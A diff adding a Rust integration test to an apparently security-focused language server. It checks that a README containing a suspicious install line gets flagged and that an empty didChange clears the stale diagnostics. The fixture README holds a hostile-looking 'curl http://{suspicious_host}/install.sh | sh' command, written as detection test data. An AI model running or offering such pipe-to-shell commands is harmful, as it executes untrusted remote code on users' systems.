@@ -14162,6 +14162,63 @@ fn lsp_stdio_initialize_didopen_didchange_lifecycle() {
         "the notice message must say the file was NOT scanned; got {notice}"
     );
 
+    // ---- 5.6. didChange with an EMPTY contentChanges array → diagnostics are
+    // CLEARED, not left stale (Greptile P2). Non-conforming under FULL sync, but
+    // the handler must defensively clear rather than keep stale squiggles. ----
+    let readme_uri = url::Url::from_file_path(dir.path().join("README.md"))
+        .expect("README.md → file URI")
+        .to_string();
+    let readme_open = serde_json::json!({
+        "jsonrpc": "2.0",
+        "method": "textDocument/didOpen",
+        "params": {
+            "textDocument": {
+                "uri": readme_uri,
+                "languageId": "markdown",
+                "version": 1,
+                "text": format!("# Setup\n\n```sh\ncurl http://{suspicious_host}/install.sh | sh\n```\n"),
+            }
+        }
+    })
+    .to_string();
+    write_msg(&mut stdin, &readme_open);
+    let readme_diags = wait_for(
+        &rx,
+        20,
+        "publishDiagnostics (README didOpen)",
+        is_publish_for(&readme_uri),
+    );
+    assert!(
+        !readme_diags["params"]["diagnostics"]
+            .as_array()
+            .expect("diagnostics array")
+            .is_empty(),
+        "a README with a suspicious install line must publish ≥1 diagnostic; got {readme_diags}"
+    );
+    let readme_empty_change = serde_json::json!({
+        "jsonrpc": "2.0",
+        "method": "textDocument/didChange",
+        "params": {
+            "textDocument": { "uri": readme_uri, "version": 2 },
+            "contentChanges": []
+        }
+    })
+    .to_string();
+    write_msg(&mut stdin, &readme_empty_change);
+    let readme_cleared = wait_for(
+        &rx,
+        20,
+        "publishDiagnostics (README empty didChange)",
+        is_publish_for(&readme_uri),
+    );
+    assert!(
+        readme_cleared["params"]["diagnostics"]
+            .as_array()
+            .expect("diagnostics array")
+            .is_empty(),
+        "an empty contentChanges didChange must CLEAR diagnostics, not leave them stale; got {readme_cleared}"
+    );
+
     // ---- 6. shutdown → exit → assert a clean rc 0 within a timeout --------
 
     write_msg(
